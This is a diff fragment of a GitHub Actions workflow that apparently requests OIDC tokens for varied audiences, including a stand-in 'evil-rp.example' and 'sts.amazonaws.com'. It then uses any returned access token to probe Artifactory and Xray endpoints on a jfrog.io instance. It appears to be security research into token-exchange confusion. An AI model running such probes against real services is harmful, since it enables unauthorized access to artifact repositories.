@@ -19,7 +19,7 @@ jobs:
             J=$(python3 -c 'import json;b=open("/tmp/o").read();print(json.loads(b).get("access_token","") if b.startswith("{") else "")')
             [ -n "$J" ] && for U in /artifactory/api/repositories /xray/api/v1/system/version; do echo "HTTP svc $U $(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $J" https://trialuakwcj.jfrog.io$U)"; done
           }
-          ex jfrog-github sanhacks2/r1pin@github
           ex evil-rp.example ""
+          ex sts.amazonaws.com ""
+          ex r2aud ""
           ex evil-rp.example r2audgh
-          ex r2aud r2audgh
